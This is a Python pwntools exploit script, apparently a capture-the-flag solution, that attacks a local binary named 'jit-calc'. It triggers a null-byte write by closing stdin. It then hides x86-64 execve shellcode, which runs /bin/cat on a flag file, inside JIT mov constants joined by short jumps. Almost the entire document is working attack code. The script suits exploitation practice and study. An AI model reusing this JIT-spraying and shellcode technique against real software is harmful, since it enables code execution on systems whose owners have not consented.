from pwn import *

#I started to make this exploit nice, but gave up later. Sorry!
#Basically exploiting the assembly corresponding to: line[strlen(line) - 1] = '\0';
#We make strlen(line) = 0 by closing stdin, resulting in a null byte write
#We embed our shellcode in jit mov constants
pe = process('./jit-calc')

def changeIdx(idx):
        pe.readuntil("Run code")
        pe.sendline("1")
        pe.readuntil("0-9")
        pe.sendline(str(idx))

def exitIt():
        pe.readuntil("Run code")
        pe.sendline("3")

def runCode():
        pe.readuntil("Run code")
        pe.sendline("4")


def writeCode(toWrite):
        pe.readuntil("Run code")
        pe.sendline("2")
        pe.recvuntil("Constant Value")
        for instr in toWrite:
                if instr[0]=='add':
                        pe.sendline("2")
                        pe.recvuntil("2 to Register 2")
                        #Not even used, so whatever
                elif instr[0]=='mov':
                        pe.sendline("3")
                        #let's just use rax to make this easy
                        pe.sendline("1")
                        pe.readuntil("constant")
                        pe.sendline(str(instr[1]))
                        log.info("Writing " + hex(instr[1]))
                elif instr[0]=="ret":
                        pe.sendline("1")
                        log.info("Writing ret")
ret=("ret",0)
mov="mov"
asmStr="""
0:  48 31 d2                xor    rdx,rdx
3:  be 2f 63 61 74          mov    esi,0x7461632f
8:  bb 2f 62 69 6e          mov    ebx,0x6e69622f
d:  48 c1 e6 20             shl    rsi,0x20
11: 48 01 de                add    rsi,rbx
14: b8 66 6c 61 67          mov    eax,0x67616c66
19: 52                      push   rdx
1a: 50                      push   rax
1b: 48 89 e1                mov    rcx,rsp
1e: 52                      push   rdx
1f: 56                      push   rsi
20: 48 89 e7                mov    rdi,rsp
23: 52                      push   rdx
24: 51                      push   rcx
25: 57                      push   rdi
26: 48 89 e6                mov    rsi,rsp
29: b8 3b 00 00 00          mov    eax,0x3b
2e: 0f 05                   syscall
"""
def addExp(exploit,stuff):
        stuff=stuff[stuff.find(":")+1:]
        res=""
        for b in stuff.split(" "):
                try:
                        x = int(b,16)
                        if(len(b)==2):
                                res=b+res
                except:
                        pass
        res="90"*((12-len(res))/2)+res
        res="0x02eb"+res
        exploit.append((mov,int(res,16)))


exploit=[]
for i in range(8):
        exploit.append((mov,1))
exploit.append((mov,0x02EBffddeeddccbb))
for line in asmStr.split("\n"):
        addExp(exploit,line)

exploit.append((ret))

writeCode(exploit)

changeIdx(7)
pe.clean()
pe.stdin.close()
pe.interactive()
